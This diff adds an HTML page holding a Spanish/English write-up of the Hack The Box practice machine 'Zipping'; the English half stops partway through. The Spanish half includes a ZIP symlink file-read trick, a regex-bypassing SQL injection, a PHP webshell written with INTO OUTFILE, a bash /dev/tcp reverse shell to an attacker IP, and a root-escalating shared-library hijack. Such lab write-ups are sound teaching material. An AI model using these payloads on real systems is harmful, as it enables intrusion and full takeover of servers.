@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zipping | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">zipping</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo alojaba una aplicación web de venta de relojes con funcionalidad de subida de archivos ZIP. Explotando una vulnerabilidad de path traversal mediante enlaces simbólicos dentro de archivos ZIP comprimidos, conseguí acceso de lectura a archivos arbitrarios del sistema.</p>
+                    
+                    <p>Mediante esta técnica, extraje el código fuente de la aplicación, revelando credenciales de base de datos MySQL y una vulnerabilidad de inyección SQL en <code>product.php</code> que, aunque protegida por un filtro <code>preg_match()</code>, pude bypassear utilizando el carácter <code>%0A</code> (nueva línea).</p>
+                    
+                    <p>Aprovechando que el usuario de MySQL era <code>root</code> con privilegio <code>FILE</code>, utilicé la inyección SQL UNION para escribir una webshell PHP en <code>/dev/shm/</code>. Posteriormente, explotando un fallo de Local File Inclusion (LFI) en <code>index.php</code>, conseguí ejecutar la webshell y obtener acceso inicial como el usuario <code>rektsu</code>.</p>
+                    
+                    <p>Para la escalada de privilegios, identifiqué que el usuario tenía permisos <code>sudo</code> sobre el binario <code>/usr/bin/stock</code>. Mediante análisis con <code>ltrace</code>, descubrí que el programa intentaba cargar una librería compartida desde <code>/home/rektsu/.config/libcounter.so</code>, que no existía. Creé una librería maliciosa con un constructor que ejecutaba <code>/bin/bash</code>, y al ejecutar el binario con <code>sudo</code>, obtuve una shell como <code>root</code>.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Zip symlink path traversal, bypass de filtros regex en PHP con <code>%0A</code>, inyección SQL UNION, escritura de archivos mediante <code>INTO OUTFILE</code> de MySQL, Local File Inclusion (LFI), hijacking de librerías compartidas en binarios ELF.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar los puertos abiertos y servicios en ejecución:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos: SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela dos servicios principales: SSH en el puerto 22 y un servidor web HTTP en el puerto 80. No parece haber configuraciones de virtual hosting adicionales.</p>
+
+                <h3>Enumeración Web Inicial</h3>
+                <p>Al navegar al puerto 80, encuentro una aplicación web de venta de relojes. Ejecutando <code>whatweb</code> obtengo información técnica del servidor:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229 [200 OK] Apache[2.4.54], Bootstrap, Country[RESERVED][ZZ], 
+Email[info@website.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.54 (Ubuntu)], 
+IP[10.10.11.229], JQuery[3.4.1], Meta-Author[Devcrud], PoweredBy[precision], 
+Script, Title[Zipping | Watch store]</code></pre>
+
+                <p>Aunque <code>whatweb</code> no detecta PHP explícitamente, al navegar por la web encuentro un botón que redirige a <code>upload.php</code>, confirmando que el backend utiliza PHP.</p>
+
+                <h3>Funcionalidad de Subida de Archivos</h3>
+                <p>La ruta más interesante es <code>upload.php</code>, que permite subir archivos ZIP:</p>
+                <p><img src="./media/image5.png" alt="Interfaz de subida de archivos ZIP mostrando el formulario de upload.php" /></p>
+
+                <p>Ejecutando <code>gobuster</code> para descubrir directorios adicionales, encuentro:</p>
+                <p><img src="./media/image4.png" alt="Resultados de gobuster mostrando directorios descubiertos como /uploads, /assets y /shop" /></p>
+
+                <p>El directorio <code>/uploads</code> no tiene directory listing habilitado, y <code>/assets</code> no contiene nada relevante. Sin embargo, en <code>/shop</code> encuentro una estructura interesante:</p>
+                <p><img src="./media/image7.png" alt="Contenido del directorio /shop mostrando archivos PHP incluyendo product.php e index.php" /></p>
+
+                <h2>Análisis de Funcionalidad y Vectores de Ataque</h2>
+                
+                <h3>Investigando product.php</h3>
+                <p>Al acceder a <code>product.php</code> directamente, obtengo un error:</p>
+                <p><img src="./media/image3.png" alt="Error 500 Internal Server Error al acceder directamente a product.php" /></p>
+
+                <p>Probando con parámetros como <code>?id=1</code> devuelve error 500, mientras que <code>?id=a</code> me redirige a <code>/shop/index.php</code>. Este comportamiento sugiere procesamiento de entrada y posibles vulnerabilidades.</p>
+
+                <h3>Probando la Subida de Archivos ZIP</h3>
+                <p>Al subir un archivo ZIP de prueba, la aplicación me devuelve un enlace que funciona y menciona que el staff revisará el contenido:</p>
+                <p><img src="./media/image8.png" alt="Respuesta tras subir un archivo ZIP mostrando el enlace de descarga y mensaje de revisión" /></p>
+
+                <p>Dado el nombre de la máquina ("zipping"), sospecho que la vulnerabilidad principal podría estar relacionada con el manejo de archivos ZIP, posiblemente path traversal mediante enlaces simbólicos o explotación del proceso de descompresión.</p>
+
+                <h2>Explotación: Zip Symlink Path Traversal</h2>
+                
+                <p>Decido probar una técnica de path traversal utilizando enlaces simbólicos dentro de archivos ZIP. Esta técnica explota el hecho de que algunos sistemas descomprimen archivos ZIP sin validar adecuadamente si contienen symlinks que apuntan a ubicaciones arbitrarias del sistema.</p>
+
+                <h3>Creando el Payload</h3>
+                <p>Primero, creo un archivo PDF vacío que es en realidad un enlace simbólico a <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">ln -s /etc/passwd test.pdf</code></pre>
+
+                <p>Luego lo comprimo en un ZIP preservando la referencia del symlink usando la opción <code>--symlinks</code>:</p>
+                <pre><code class="language-bash">zip --symlinks xd.zip test.pdf</code></pre>
+
+                <p>La salida confirma que el archivo se ha agregado:</p>
+                <pre><code class="language-plaintext">adding: test.pdf (stored 0%)</code></pre>
+
+                <h3>Verificando el Path Traversal</h3>
+                <p>Subo el archivo ZIP a la aplicación y al visitar la URL proporcionada, confirmo que puedo leer <code>/etc/passwd</code> de la máquina víctima:</p>
+                <pre><code class="language-bash">curl http://10.10.11.229/uploads/711b73f8f7ddf6601a040a82bf6680a5/test.pdf | grep bash</code></pre>
+
+                <p>El resultado muestra usuarios con shell bash:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+rektsu:x:1001:1001::/home/rektsu:/bin/bash</code></pre>
+
+                <p>¡Tengo path traversal confirmado! Esto me permite leer archivos arbitrarios del sistema a los que el usuario del servidor web tenga acceso.</p>
+
+                <h3>Automatización del Proceso</h3>
+                <p>Para facilitar la lectura de archivos, creo un script Python que automatiza el proceso de creación del ZIP con symlink, subida y descarga del contenido. Esto me permite explorar el sistema de archivos de manera eficiente.</p>
+
+                <h2>Extracción de Código Fuente y Credenciales</h2>
+                
+                <p>Utilizando el path traversal, leo el código fuente de la aplicación web. En <code>/var/www/html/shop/functions.php</code> encuentro credenciales de base de datos:</p>
+                <pre><code class="language-php">&lt;?php
+function pdo_connect_mysql() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = 'localhost';
+    $DATABASE_USER = 'root';
+    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
+    $DATABASE_NAME = 'zipping';
+    try {
+        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', 
+                       $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+        exit('Failed to connect to database!');
+    }
+}</code></pre>
+
+                <p>Es interesante notar que el usuario de MySQL es <code>root</code>, lo que podría tener implicaciones de seguridad significativas más adelante.</p>
+
+                <h3>Analizando product.php</h3>
+                <p>Al examinar el código de <code>product.php</code>, entiendo el comportamiento observado anteriormente. El archivo contiene una vulnerabilidad de inyección SQL, pero está protegida por un filtro de caracteres:</p>
+                <pre><code class="language-php">&lt;?php
+// Check to make sure the id parameter is specified in the URL
+if (isset($_GET['id'])) {
+    $id = $_GET['id'];
+    // Filtering user input for letters or special characters
+    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.&lt;&gt;\/?]|[^0-9]$/", $id, $match)) {
+        header('Location: index.php');
+    } else {
+        // Prepare statement and execute, but does not prevent SQL injection
+        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
+        $stmt->execute();
+        $product = $stmt->fetch(PDO::FETCH_ASSOC);
+        if (!$product) {
+            exit('Product does not exist!');
+        }
+    }
+} else {
+    exit('No ID provided!');
+}
+?&gt;</code></pre>
+
+                <p>El código usa <code>prepare()</code> pero luego interpola directamente la variable <code>$id</code> en la query, haciéndola vulnerable a inyección SQL. El filtro <code>preg_match()</code> intenta bloquear caracteres especiales y letras, pero tiene una debilidad.</p>
+
+                <h3>Entendiendo el Error 500</h3>
+                <p>Al llamar a <code>product.php</code> directamente obtengo error 500 porque este script está diseñado para ser incluido desde otra página:</p>
+                <p><img src="./media/image1.png" alt="Error 500 mostrando que product.php debe ser incluido desde otra página" /></p>
+
+                <p>Examinando <code>/shop/index.php</code>, veo cómo funciona el sistema de inclusión:</p>
+                <pre><code class="language-php">&lt;?php
+session_start();
+// Include functions and connect to the database using PDO MySQL
+include 'functions.php';
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default
+$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
+// Include and show the requested page
+include $page . '.php';
+?&gt;</code></pre>
+
+                <p>Este código incluye <code>functions.php</code> que proporciona la conexión PDO necesaria. También noto un patrón de inclusión potencialmente vulnerable con el parámetro <code>page</code>, aunque el check de <code>file_exists()</code> y la concatenación de <code>.php</code> dificultan su explotación inmediata.</p>
+
+                <h2>Bypass del Filtro preg_match() e Inyección SQL</h2>
+                
+                <h3>Identificando el Bypass</h3>
+                <p>Tras experimentar con diferentes payloads, descubro que puedo bypassear el primer check de <code>preg_match()</code> utilizando <code>%0A</code> (carácter de nueva línea). Además, puedo bypassear el segundo check terminando la query con un número.</p>
+
+                <p>Por ejemplo, esta URL devuelve el primer reloj exitosamente:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=product&id=%0A'or+1=1--+-1</code></pre>
+
+                <h3>Probando con SQLMap</h3>
+                <p>Intento automatizar la explotación con <code>sqlmap</code> utilizando las opciones <code>--prefix</code> y <code>--suffix</code>:</p>
+                <pre><code class="language-bash">sqlmap -u "http://10.10.11.229/shop/index.php?page=product&id=1" --prefix "%0A'" --suffix="-- -1" -p id --batch</code></pre>
+
+                <p>SQLMap confirma la vulnerabilidad de inyección SQL mediante stacked queries:</p>
+                <pre><code class="language-plaintext">---
+Parameter: id (GET)
+Type: stacked queries
+Title: MySQL >= 5.0.12 stacked queries (comment)
+Payload: page=product&id=1
+';SELECT SLEEP(5)'-- -1
+---</code></pre>
+
+                <p>Sin embargo, esta técnica es lenta. Especificando la técnica UNION, que es más eficiente, obtengo mejores resultados:</p>
+                <pre><code class="language-bash">sqlmap -u "http://10.10.11.229/shop/index.php?page=product&id=*" --prefix "%0A'" --suffix="-- -1" -p id --batch --technique=U</code></pre>
+
+                <p>SQLMap encuentra una inyección UNION válida:</p>
+                <pre><code class="language-plaintext">---
+Parameter: #1* (URI)
+Type: UNION query
+Title: Generic UNION query (NULL) - 8 columns
+Payload: http://10.10.11.229/shop/index.php?page=product&id=
+' UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT('qvpbq','zWkYmxHsuJaSOwYtwOLmKxQQKniHkiatglNcdvSB'),'qbzzq'),NULL,NULL,NULL,NULL-- -1
+---</code></pre>
+
+                <h3>Enumeración de Bases de Datos</h3>
+                <p>Enumero las bases de datos disponibles:</p>
+                <pre><code class="language-plaintext">information_schema, mysql, performance_schema, sys, zipping</code></pre>
+
+                <p>La base de datos <code>zipping</code> solo contiene datos de prueba sin información útil. Sin embargo, al revisar <code>information_schema</code> para verificar privilegios, descubro algo crucial:</p>
+                <pre><code class="language-plaintext">| 'root'@'localhost' | YES | def | FILE</code></pre>
+
+                <p>El usuario de MySQL tiene el privilegio <code>FILE</code>, lo que significa que puedo interactuar con el sistema de archivos dentro de los límites de acceso de MySQL. Según la <a href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file">documentación de MySQL</a>, esto permite leer y escribir archivos en el servidor.</p>
+
+                <h2>Escritura de Webshell mediante SQL Injection</h2>
+                
+                <h3>Estrategia de Explotación</h3>
+                <p>Con el privilegio <code>FILE</code>, puedo usar la inyección SQL para escribir archivos en el servidor. Mi objetivo es escribir una webshell PHP que me permita ejecutar comandos.</p>
+
+                <p>Aunque intento usar <code>sqlmap</code> para escribir archivos, no lo consigo, así que procedo manualmente. Construyo esta query de inyección SQL UNION:</p>
+                <pre><code class="language-sql">UNION ALL SELECT NULL,NULL,NULL,'&lt;?php system($_GET["cmd"]); ?&gt;',NULL,NULL,NULL,NULL INTO OUTFILE '/dev/shm/xd.php'-- -1</code></pre>
+
+                <p>La URL completa con URL encoding es:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=product&id=%0A%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,%27%3C?php%20system($_GET%5B%22cmd%22%5D);%20?%3E%27,NULL,NULL,NULL,NULL%20INTO%20OUTFILE%20%27/dev/shm/xd.php%27--%20-1</code></pre>
+
+                <h3>Selección del Directorio de Escritura</h3>
+                <p>Inicialmente intenté escribir en <code>/tmp</code>, pero Apache parece estar usando un entorno sandbox que no me permite acceder a ese directorio. En su lugar, consigo escribir en <code>/dev/shm/</code>, que es un sistema de archivos temporal en memoria.</p>
+
+                <p>Verifico que la webshell se ha escrito correctamente usando el path traversal descubierto anteriormente:</p>
+                <pre><code class="language-plaintext">============================================================
+Contents of /dev/shm/xd.php:
+============================================================
+\N \N \N &lt;?php system($_GET["cmd"]); ?&gt; \N \N \N \N</code></pre>
+
+                <h2>Local File Inclusion y Acceso Inicial</h2>
+                
+                <h3>Explotando el LFI</h3>
+                <p>Recordando la vulnerabilidad potencial de LFI en <code>/shop/index.php</code>, intento acceder a mi webshell. Aunque el código añade <code>.php</code> al final y verifica la existencia del archivo, puedo aprovechar que mi archivo está en <code>/dev/shm/xd.php</code>:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=/dev/shm/xd&cmd=id</code></pre>
+
+                <p>La webshell funciona:</p>
+                <p><img src="./media/image6.png" alt="Webshell ejecutándose exitosamente mostrando el output del comando id" /></p>
+
+                <h3>Obteniendo Reverse Shell</h3>
+                <p>Con ejecución de comandos confirmada, me envío una reverse shell usando este payload:</p>
+                <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"</code></pre>
+
+                <p>URL encoded completa:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=/dev/shm/xd&cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.2/443 0>%261"</code></pre>
+
+                <p>Configuro un listener de <code>netcat</code>:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Y recibo la conexión exitosamente como el usuario <code>rektsu</code>:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.229] 37454
+bash: cannot set terminal process group (1133): Inappropriate ioctl for device
+bash: no job control in this shell
+rektsu@zipping:/var/www/html/shop$</code></pre>
+
+                <p>Ahora tengo acceso como <code>rektsu</code> y puedo leer la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios: Shared Library Hijacking</h2>
+                
+                <h3>Enumeración de Privilegios Sudo</h3>
+                <p>Verifico los privilegios <code>sudo</code> del usuario <code>rektsu</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>El resultado muestra algo interesante:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for rektsu on zipping:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User rektsu may run the following commands on zipping:
+    (ALL) NOPASSWD: /usr/bin/stock</code></pre>
+
+                <p>El usuario puede ejecutar <code>/usr/bin/stock</code> con <code>sudo</code> sin contraseña. Verifico el tipo de archivo:</p>
+                <pre><code class="language-bash">file /usr/bin/stock</code></pre>
+
+                <pre><code class="language-plaintext">/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
+interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, 
+for GNU/Linux 3.2.0, not stripped</code></pre>
+
+                <p>Es un binario ELF de 64 bits, enlazado dinámicamente y no despojado de símbolos.</p>
+
+                <h3>Análisis del Binario</h3>
+                <p>Al ejecutar el binario, solicita una contraseña:</p>
+                <pre><code class="language-bash">sudo /usr/bin/stock</code></pre>
+
+                <pre><code class="language-plaintext">Enter the password:</code></pre>
+
+                <p>Usando <code>strings</code> sobre el binario, encuentro la contraseña: <code>St0ckM4nager</code>.</p>
+
+                <p>El programa parece ser un sistema simple de gestión de inventario que almacena valores en <code>/root/.stock.csv</code>. El menú principal muestra:</p>
+                <pre><code class="language-plaintext">================== Stock Actual ==================
+Colour Black Gold Silver
+Amount 4 2237 5
+Quality Excelent Average Poor
+Amount 4 15 2227
+Exclusive Yes No
+Amount 4 2241
+Warranty Yes No
+Amount 4 2241</code></pre>
+
+                <h3>Análisis Dinámico con ltrace</h3>
+                <p>Al no encontrar vulnerabilidades evidentes mediante pruebas manuales, uso <code>ltrace</code> con la opción <code>-s 4096</code> para capturar llamadas a funciones de librería sin truncamiento:</p>
+                <pre><code class="language-bash">ltrace -s 4096 ./stock</code></pre>
+
+                <p>El output revela una llamada crucial:</p>
+                <pre><code class="language-plaintext">printf("Enter the password: ") = 20
+fgets(Enter the password: St0ckM4nager
+"St0ckM4nager\n", 30, 0x7ff94db528e0) = 0x7ffd17efa040
+strchr("St0ckM4nager\n", '\n') = "\n"
+strcmp("St0ckM4nager", "St0ckM4nager") = 0
+dlopen("/home/rektsu/.config/libcounter.so0", 1) = nil</code></pre>
+
+                <p>¡El binario intenta cargar una librería compartida desde <code>/home/rektsu/.config/libcounter.so</code>! La llamada a <code>dlopen()</code> retorna <code>nil</code>, lo que significa que la librería no existe.</p>
+
+                <h3>Verificando la Ruta</h3>
+                <p>Confirmo que el directorio existe pero está vacío:</p>
+                <pre><code class="language-bash">ls -la /home/rektsu/.config</code></pre>
+
+                <pre><code class="language-plaintext">total 8
+drwxrwxr-x 2 rektsu rektsu 4096 May 4 2023 .
+drwxr-x--x 7 rektsu rektsu 4096 Aug 7 2023 ..</code></pre>
+
+                <h3>Explotación mediante Librería Maliciosa</h3>
+                <p>Esta es una vulnerabilidad perfecta para shared library hijacking. Si coloco una librería maliciosa en la ruta esperada, el binario la cargará cuando se ejecute con <code>sudo</code>, permitiéndome ejecutar código como <code>root</code>.</p>
+
+                <p>Creo un archivo en C con una función constructor que se ejecutará automáticamente al cargarse la librería:</p>
+                <pre><code class="language-c">#include &lt;stdlib.h&gt;
+
+__attribute__ ((__constructor__))
+void shell(void){
+    system("/bin/bash");
+}</code></pre>
+
+                <p>El atributo <code>__constructor__</code> marca la función <code>shell()</code> como un constructor, lo que garantiza que se ejecute inmediatamente cuando la librería sea cargada por <code>dlopen()</code>.</p>
+
+                <h3>Compilación y Transferencia</h3>
+                <p>Compilo el código como librería compartida usando <code>gcc</code>:</p>
+                <pre><code class="language-bash">gcc -shared -o libcounter.so -fPIC xd.c</code></pre>
+
+                <p>Las opciones importantes son:</p>
+                <ul>
+                    <li><code>-shared</code>: Produce una librería compartida</li>
+                    <li><code>-fPIC</code>: Genera código independiente de posición (Position Independent Code), necesario para librerías compartidas</li>
+                </ul>
+
+                <p>Transfiero la librería a la máquina víctima directamente en el directorio esperado:</p>
+                <pre><code class="language-bash">ls -la /home/rektsu/.config</code></pre>
+
+                <pre><code class="language-plaintext">total 24
+drwxrwxr-x 2 rektsu rektsu 4096 Dec 29 17:07 .
+drwxr-x--x 7 rektsu rektsu 4096 Aug 7 2023 ..
+-rw-r--r-- 1 rektsu rektsu 15376 Dec 29 16:57 libcounter.so</code></pre>
+
+                <h3>Obteniendo Root</h3>
+                <p>Con la librería maliciosa en su lugar, ejecuto el binario con <code>sudo</code>:</p>
+                <pre><code class="language-bash">sudo /usr/bin/stock</code></pre>
+
+                <p>Introduzco la contraseña <code>St0ckM4nager</code>, y cuando el programa intenta cargar <code>libcounter.so</code> mediante <code>dlopen()</code>, mi constructor se ejecuta y obtengo una shell como <code>root</code>:</p>
+                <pre><code class="language-plaintext">Enter the password: St0ckM4nager
+root@zipping:/home/rektsu/.config#</code></pre>
+
+                <p>Ahora tengo acceso completo como <code>root</code> y puedo leer la flag final, completando así la máquina.</p>
+            </div>
+
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine hosted a web application for selling watches with ZIP file upload functionality. By exploiting a path traversal vulnerability through symbolic links inside compressed ZIP files, I gained arbitrary file read access to the system.</p>
+                    
+                    <p>Using this technique, I extracted the application's source code, revealing MySQL database credentials and a SQL injection vulnerability in <code>product.php</code> that, although protected by a <code>preg_match()</code> filter, I was able to bypass using the <code>%0A</code> (newline) character.</p>
+                    
+                    <p>Taking advantage of the MySQL user being <code>root</code> with <code>FILE</code> privilege, I used UNION SQL injection to write a PHP webshell to <code>/dev/shm/</code>. Subsequently, by exploiting a Local File Inclusion (LFI) vulnerability in <code>index.php</code>, I managed to execute the webshell and obtain initial access as the <code>rektsu</code> user.</p>
+                    
+                    <p>For privilege escalation, I identified that the user had <code>sudo</code> permissions on the <code>/usr/bin/stock</code> binary. Through analysis with <code>ltrace</code>, I discovered the program attempted to load a shared library from <code>/home/rektsu/.config/libcounter.so</code>, which didn't exist. I created a malicious library with a constructor that executed <code>/bin/bash</code>, and by running the binary with <code>sudo</code>, I obtained a shell as <code>root</code>.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Zip symlink path traversal, PHP regex filter bypass with <code>%0A</code>, UNION SQL injection, file write via MySQL <code>INTO OUTFILE</code>, Local File Inclusion (LFI), ELF binary shared library hijacking.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an <code>nmap</code> scan to identify open ports and running services:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results showing open ports: SSH on 22 and HTTP on 80" /></p>
+
+                <p>The scan reveals two main services: SSH on port 22 and an HTTP web server on port 80. There don't appear to be any additional virtual hosting configurations.</p>
+
+                <h3>Initial Web Enumeration</h3>
+                <p>Navigating to port 80, I find a web application for selling watches. Running <code>whatweb</code> provides technical information about the server:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229 [200 OK] Apache[2.4.54], Bootstrap, Country[RESERVED][ZZ], 
+Email[info@website.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.54 (Ubuntu)], 
+IP[10.10.11.229], JQuery[3.4.1], Meta-Author[Devcrud], PoweredBy[precision], 
+Script, Title[Zipping | Watch store]</code></pre>
+
+                <p>Although <code>whatweb</code> doesn't explicitly detect PHP, while browsing the website I find a button that redirects to <code>upload.php</code>, confirming the backend uses PHP.</p>
+
+                <h3>File Upload Functionality</h3>
+                <p>The most interesting route is <code>upload.php</code>, which allows uploading ZIP files:</p>
+                <p><img src="./media/image5.png" alt="ZIP file upload interface showing the upload.php form" /></p>
+
+                <p>Running <code>gobuster</code> to discover additional directories, I find:</p>
+                <p><img src="./media/image4.png" alt="Gobuster results showing discovered directories like /uploads, /assets, and /shop" /></p>
+
+                <p>The <code>/uploads</code> directory doesn't have directory listing enabled, and <code>/assets</code> contains nothing relevant. However, in <code>/shop</code> I find an interesting structure:</p>
+                <p><img src="./media/image7.png" alt="Contents of /shop directory showing PHP files including product.php and index.php" /></p>
+
+                <h2>Functionality Analysis and Attack Vectors</h2>
+                
+                <h3>Investigating product.php</h3>
+                <p>When accessing <code>product.php</code> directly, I get an error:</p>
+                <p><img src="./media/image3.png" alt="500 Internal Server Error when accessing product.php directly" /></p>
+
+                <p>Testing with parameters like <code>?id=1</code> returns a 500 error, while <code>?id=a</code> redirects me to <code>/shop/index.php</code>. This behavior suggests input processing and potential vulnerabilities.</p>
+
+                <h3>Testing ZIP File Upload</h3>
+                <p>When uploading a test ZIP file, the application returns a working link and mentions that staff will review the content:</p>
+                <p><img src="./media/image8.png" alt="Response after uploading a ZIP file showing the download link and review message" /></p>
+
+                <p>Given the machine's name ("zipping"), I suspect the main vulnerability could be related to ZIP file handling, possibly path traversal via symbolic links or exploitation of the decompression process.</p>
+
+                <h2>Exploitation: Zip Symlink Path Traversal</h2>
+                
+                <p>I decide to test a path traversal technique using symbolic links inside ZIP files. This technique exploits the fact that some systems decompress ZIP files without properly validating whether they contain symlinks pointing to arbitrary system locations.</p>
+
+                <h3>Creating the Payload</h3>
+                <p>First, I create an empty PDF file that is actually a symbolic link to <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">ln -s /etc/passwd test.pdf</code></pre>
+
+                <p>Then I compress it into a ZIP while preserving the symlink reference using the <code>--symlinks</code> option:</p>
+                <pre><code class="language-bash">zip --symlinks xd.zip test.pdf</code></pre>
+
+                <p>The output confirms the file has been added:</p>
+                <pre><code class="language-plaintext">adding: test.pdf (stored 0%)</code></pre>
+
+                <h3>Verifying Path Traversal</h3>
+                <p>I upload the ZIP file to the application and when visiting the provided URL, I confirm that I can read <code>/etc/passwd</code> from the victim machine:</p>
+                <pre><code class="language-bash">curl http://10.10.11.229/uploads/711b73f8f7ddf6601a040a82bf6680a5/test.pdf | grep bash</code></pre>
+
+                <p>The result shows users with bash shells:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+rektsu:x:1001:1001::/home/rektsu:/bin/bash</code></pre>
+
+                <p>I have confirmed path traversal! This allows me to read arbitrary system files that the web server user has access to.</p>
+
+                <h3>Process Automation</h3>
+                <p>To facilitate file reading, I create a Python script that automates the process of creating the ZIP with symlink, uploading, and downloading the content. This allows me to explore the filesystem efficiently.</p>
+
+                <h2>Source Code Extraction and Credentials</h2>
+                
+                <p>Using the path traversal, I read the web application's source code. In <code>/var/www/html/shop/functions.php</code> I find database credentials:</p>
+                <pre><code class="language-php">&lt;?php
+function pdo_connect_mysql() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = 'localhost';
+    $DATABASE_USER = 'root';
+    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
+    $DATABASE_NAME = 'zipping';
+    try {
+        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', 
+                       $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+        exit('Failed to connect to database!');
+    }
+}</code></pre>
+
+                <p>It's interesting to note that the MySQL user is <code>root</code>, which could have significant security implications later.</p>
+
+                <h3>Analyzing product.php</h3>
+                <p>When examining the code in <code>product.php</code>, I understand the previously observed behavior. The file contains a SQL injection vulnerability, but it's protected by a character filter:</p>
+                <pre><code class="language-php">&lt;?php
+// Check to make sure the id parameter is specified in the URL
+if (isset($_GET['id'])) {
+    $id = $_GET['id'];
+    // Filtering user input for letters or special characters
+    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.&lt;&gt;\/?]|[^0-9]$/", $id, $match)) {
+        header('Location: index.php');
+    } else {
+        // Prepare statement and execute, but does not prevent SQL injection
+        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
+        $stmt->execute();
+        $product = $stmt->fetch(PDO::FETCH_ASSOC);
+        if (!$product) {
+            exit('Product does not exist!');
+        }
+    }
+} else {
+    exit('No ID provided!');
+}
+?&gt;</code></pre>
+
+                <p>The code uses <code>prepare()</code> but then directly interpolates the <code>$id</code> variable into the query, making it vulnerable to SQL injection. The <code>preg_match()</code> filter attempts to block special characters and letters, but has a weakness.</p>
+
+                <h3>Understanding the 500 Error</h3>
+                <p>When calling <code>product.php</code> directly I get a 500 error because this script is designed to be included from another page:</p>
+                <p><img src="./media/image1.png" alt="Error 500 showing that product.php must be included from another page" /></p>
+
+                <p>Examining <code>/shop/index.php</code>, I see how the inclusion system works:</p>
+                <pre><code class="language-php">&lt;?php
+session_start();
+// Include functions and connect to the database using PDO MySQL
+include 'functions.php';
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default
+$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
+// Include and show the requested page
+include $page . '.php';
+?&gt;</code></pre>
+
